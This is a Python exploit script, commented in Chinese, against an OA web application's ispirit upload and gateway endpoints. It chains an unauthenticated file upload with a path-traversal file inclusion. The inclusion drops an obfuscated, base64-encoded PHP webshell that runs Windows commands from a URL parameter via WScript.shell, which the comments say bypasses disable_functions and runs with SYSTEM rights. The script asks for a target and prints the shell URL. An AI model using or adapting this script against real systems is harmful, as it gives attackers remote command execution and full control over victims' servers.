import os
import requests

# 定义webshell，因为是包含，所以用写入马比较方便
# 这个马自带bypass disable_function 功能
shell = '''<?php
$fp = fopen('readme.php', 'w+');
$a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");
fwrite($fp, urldecode($a));
fclose($fp);
?>
'''

# 输入目标
url = input("input the TARGET(example:[url]https://127.0.0.1:1080[/url])>")
# 定义上传目录和包含目录
upload_url = url+"/ispirit/im/upload.php"
include_url = url+"/ispirit/interface/gateway.php"
# 定义shell目录，如果要修改名字，需要把shell里面的一起改了
shell_url = url+"/ispirit/interface/readme.php"
files = {'ATTACHMENT': shell}
# 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session
upload_data = {"P": "123", "DEST_UID": "1", "UPLOAD_MODE": "2"}
# 上传
upload_res = requests.post(upload_url, upload_data, files=files)
# 此时会返回上传文件的路径
path = upload_res.text
# 解析返回值获取上传地址
path = path[path.find('@')+1:path.rfind('|')
            ].replace("_", "\/").replace("|", ".")
# 由于上传文件会自动改为jpg，所以要用gateway.php包含
include_data = {"json": "{\"url\":\"/general/../../attach/im/" + path+"\"}"}
# 包含+自动写入shell
include_res = requests.post(include_url, data=include_data)
# 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限
print('shell is here:'+shell_url+'?a=command')
